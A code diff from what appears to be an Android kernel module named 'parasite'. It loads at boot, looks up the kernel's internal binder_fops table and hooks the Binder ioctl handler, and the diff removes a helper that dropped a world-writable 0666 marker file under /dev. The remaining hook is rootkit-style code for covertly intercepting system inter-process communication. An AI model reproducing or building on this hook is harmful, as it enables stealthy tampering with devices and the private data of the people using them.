@@ -83,26 +83,10 @@ static long hooked_binder_ioctl(struct file *file, unsigned int cmd, unsigned lo
     return ret;
 }
 
-#include <linux/namei.h>
-static void create_single_node(void) {
-    const char *node_path = "/dev/virtpipe-common-syzs";
-    struct dentry *dentry;
-    struct path path;
-    
-    // 尝试创建节点
-    dentry = kern_path_create(AT_FDCWD, node_path, &path, 0);
-    if (!IS_ERR(dentry)) {
-        // 创建普通文件，权限 0666
-        vfs_create(d_inode(path.dentry), dentry, 0666 | S_IFREG, true);
-        done_path_create(&path, dentry);
-    }
-}
 
 // 静态初始化：系统启动自动挂载
 static int __init parasite_init(void) {
-	// 1. 启动即创建该特征文件
-    create_single_node();
-	
+
     struct file_operations *binder_fops = (struct file_operations *)kallsyms_lookup_name("binder_fops");
     if (!binder_fops) return 0;
     
